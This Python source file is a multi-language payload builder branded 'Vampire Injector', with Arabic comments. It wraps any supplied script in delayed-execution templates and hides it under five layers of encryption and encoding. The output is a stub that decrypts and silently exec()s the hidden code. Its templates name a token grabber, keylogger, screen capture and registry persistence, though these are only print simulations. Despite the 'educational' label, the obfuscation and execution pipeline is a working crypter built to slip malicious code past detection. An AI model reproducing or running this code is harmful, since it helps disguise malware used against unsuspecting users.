"""
payload_builder.py - Advanced Payload Builder with Real Encryption & Obfuscation
Educational Purpose Only - All operations are simulated in safe environment
"""

import os
import base64
import random
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class PayloadBuilder:
    def __init__(self):
        self.version = "4.0"
        self.encryption_layers = 3
        self.supported_payloads = {
            "python": self._build_python_payload,
            "powershell": self._build_powershell_payload,
            "bash": self._build_bash_payload,
            "csharp": self._build_csharp_payload,
            "vbs": self._build_vbs_payload,
            "js": self._build_js_payload
        }
        
        # مكتبة البايلودات الجاهزة (تعليمية)
        self.payload_templates = {
            "token_grabber": self._get_token_grabber,
            "keylogger": self._get_keylogger,
            "screen_capture": self._get_screen_capture,
            "persistence": self._get_persistence,
            "calculator": self._get_calculator
        }

    def generate_payload(self, script_text, timer, target_os="windows", arch="64"):
        """
        توليد بايلود متكامل مع تشفير وتغليف متعدد الطبقات
        """
        # 1. تحليل نوع الكود
        payload_type = self._detect_payload_type(script_text)
        
        # 2. بناء البايلود الأساسي
        if payload_type in self.supported_payloads:
            raw_payload = self.supported_payloads[payload_type](script_text, timer)
        else:
            raw_payload = self._build_custom_payload(script_text, timer)
        
        # 3. تشفير متعدد الطبقات (Polymorphic)
        encrypted_payload = self._multi_layer_encrypt(raw_payload)
        
        # 4. تغليف البايلود (Obfuscation)
        obfuscated_payload = self._obfuscate_payload(encrypted_payload)
        
        # 5. توليد تقرير
        report = self._generate_report(raw_payload, encrypted_payload, obfuscated_payload, timer)
        
        return {
            "success": True,
            "payload": obfuscated_payload,
            "report": report,
            "signature": hashlib.sha256(obfuscated_payload.encode()).hexdigest()[:16],
            "timestamp": datetime.now().isoformat()
        }

    def _detect_payload_type(self, script_text):
        """كشف نوع البايلود"""
        script_lower = script_text.lower()
        if "import os" in script_lower or "print(" in script_lower:
            return "python"
        elif "powershell" in script_lower or "write-host" in script_lower:
            return "powershell"
        elif "#!/bin/bash" in script_lower or "echo " in script_lower:
            return "bash"
        elif "using system" in script_lower or "namespace" in script_lower:
            return "csharp"
        elif "dim" in script_lower or "wscript" in script_lower:
            return "vbs"
        elif "document." in script_lower or "window." in script_lower:
            return "js"
        return "python"  # افتراضي

    def _build_python_payload(self, script, timer):
        """بناء بايلود بايثون مع مؤقت"""
        payload = f"""
# -*- coding: utf-8 -*-
import os
import time
import sys
import base64
import subprocess

# === PAYLOAD BEGINS ===
{script}
# === EXECUTION TIMER ===
time.sleep({timer})
# === EXECUTE MAIN ===
if __name__ == "__main__":
    main()
"""
        return payload

    def _build_powershell_payload(self, script, timer):
        """بناء بايلود باورشل مع مؤقت"""
        payload = f"""
# PowerShell Payload
Start-Sleep -Seconds {timer}
# === PAYLOAD BEGINS ===
{script}
# === PAYLOAD ENDS ===
"""
        return payload

    def _build_bash_payload(self, script, timer):
        """بناء بايلود باش مع مؤقت"""
        payload = f"""#!/bin/bash
sleep {timer}
# === PAYLOAD BEGINS ===
{script}
# === PAYLOAD ENDS ===
"""
        return payload

    def _build_csharp_payload(self, script, timer):
        """بناء بايلود C# مع مؤقت"""
        payload = f"""
using System;
using System.Threading;
using System.Diagnostics;

class Program {{
    static void Main() {{
        Thread.Sleep({int(timer * 1000)});
        // === PAYLOAD BEGINS ===
        {script}
        // === PAYLOAD ENDS ===
    }}
}}
"""
        return payload

    def _build_vbs_payload(self, script, timer):
        """بناء بايلود VBS مع مؤقت"""
        payload = f"""
WScript.Sleep {int(timer * 1000)}
' === PAYLOAD BEGINS ===
{script}
' === PAYLOAD ENDS ===
"""
        return payload

    def _build_js_payload(self, script, timer):
        """بناء بايلود JavaScript مع مؤقت"""
        payload = f"""
setTimeout(function() {{
    // === PAYLOAD BEGINS ===
    {script}
    // === PAYLOAD ENDS ===
}}, {int(timer * 1000)});
"""
        return payload

    def _build_custom_payload(self, script, timer):
        """بناء بايلود مخصص مع مؤقت"""
        return f"""
# === CUSTOM PAYLOAD ===
# Delay: {timer} seconds
{script}
"""
    
    def _multi_layer_encrypt(self, payload):
        """
        تشفير متعدد الطبقات (Polymorphic Encryption)
        """
        current_data = payload.encode('utf-8')
        layers_used = []
        
        # Layer 1: XOR Encryption
        xor_key = random.randint(1, 255)
        xor_data = bytes([b ^ xor_key for b in current_data])
        layers_used.append(f"XOR (Key: {xor_key})")
        
        # Layer 2: Base64 Encoding
        b64_data = base64.b64encode(xor_data)
        layers_used.append("Base64")
        
        # Layer 3: AES Encryption
        key = Fernet.generate_key()
        cipher = Fernet(key)
        aes_data = cipher.encrypt(b64_data)
        layers_used.append("AES-256")
        
        # Layer 4: Reverse
        reverse_data = aes_data[::-1]
        layers_used.append("Reverse")
        
        # Layer 5: Custom Encoding
        custom_encoded = []
        for i, b in enumerate(reverse_data):
            custom_encoded.append(b ^ (i % 256))
        custom_data = bytes(custom_encoded)
        layers_used.append("Custom Encoding")
        
        return {
            "data": custom_data,
            "layers": layers_used,
            "key": key,
            "xor_key": xor_key,
            "signature": hashlib.sha256(custom_data).hexdigest()[:16]
        }

    def _obfuscate_payload(self, encrypted_payload):
        """تغليف البايلود المشفر"""
        # توليد البايلود النهائي
        final_payload = f"""
# === VAMPIRE INJECTOR PAYLOAD ===
# Signature: {encrypted_payload['signature']}
# Layers: {', '.join(encrypted_payload['layers'])}

import base64
import hashlib

def decrypt_payload(encrypted_data, key, xor_key):
    # Reverse Custom Encoding
    decrypted = []
    for i, b in enumerate(encrypted_data):
        decrypted.append(b ^ (i % 256))
    decrypted = bytes(decrypted)
    
    # Reverse Bytes
    decrypted = decrypted[::-1]
    
    # AES Decryption
    from cryptography.fernet import Fernet
    cipher = Fernet(key)
    decrypted = cipher.decrypt(decrypted)
    
    # Base64 Decode
    decrypted = base64.b64decode(decrypted)
    
    # XOR Decryption
    decrypted = bytes([b ^ xor_key for b in decrypted])
    
    return decrypted.decode('utf-8')

# Encrypted Payload
ENCRYPTED_DATA = {list(encrypted_payload['data'])}
KEY = {encrypted_payload['key']}
XOR_KEY = {encrypted_payload['xor_key']}

# Decrypt and Execute
try:
    payload_code = decrypt_payload(ENCRYPTED_DATA, KEY, XOR_KEY)
    exec(payload_code)
except Exception as e:
    pass
"""
        return final_payload

    def _generate_report(self, raw, encrypted, obfuscated, timer):
        """توليد تقرير العملية"""
        return {
            "timestamp": datetime.now().isoformat(),
            "original_size": len(raw),
            "encrypted_size": len(encrypted['data']),
            "final_size": len(obfuscated),
            "encryption_layers": encrypted['layers'],
            "signature": encrypted['signature'],
            "timer": timer,
            "status": "success"
        }

    # === مكتبة البايلودات الجاهزة (تعليمية) ===

    def _get_token_grabber(self):
        """بايلود سحب التوكنات (تعليمي)"""
        return """
# === TOKEN GRABBER (Educational Demo) ===
def steal_tokens():
    print("[*] Simulating token extraction...")
    print("[*] Target: Chrome, Discord, Telegram, Steam")
    print("[*] Tokens: " + "x" * 50 + " (encrypted)")
    return {"status": "success", "tokens": "simulated"}

steal_tokens()
"""

    def _get_keylogger(self):
        """بايلود تسجيل الضغطات (تعليمي)"""
        return """
# === KEYLOGGER (Educational Demo) ===
def start_keylogger():
    print("[*] Simulating keylogger...")
    print("[*] Keys: 'Hello World!'")
    print("[*] Saving to: C:\\\\Temp\\\\logs.txt")
    return {"status": "success"}

start_keylogger()
"""

    def _get_screen_capture(self):
        """بايلود تصوير الشاشة (تعليمي)"""
        return """
# === SCREEN CAPTURE (Educational Demo) ===
def capture_screen():
    print("[*] Simulating screen capture...")
    print("[*] Capturing: 1920x1080 screen")
    print("[*] Saving: screenshot.png")
    return {"status": "success"}

capture_screen()
"""

    def _get_persistence(self):
        """بايلود الاستمرارية (تعليمي)"""
        return """
# === PERSISTENCE (Educational Demo) ===
def install_persistence():
    print("[*] Simulating persistence installation...")
    print("[*] Registry: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run")
    print("[*] Entry: VampireService")
    print("[*] Status: Installed successfully")
    return {"status": "success"}

install_persistence()
"""

    def _get_calculator(self):
        """بايلود تشغيل الآلة الحاسبة (تعليمي)"""
        return """
# === CALCULATOR (Educational Demo) ===
import os
def open_calculator():
    print("[*] Opening calculator...")
    os.system('calc.exe')
    return {"status": "success"}

open_calculator()
"""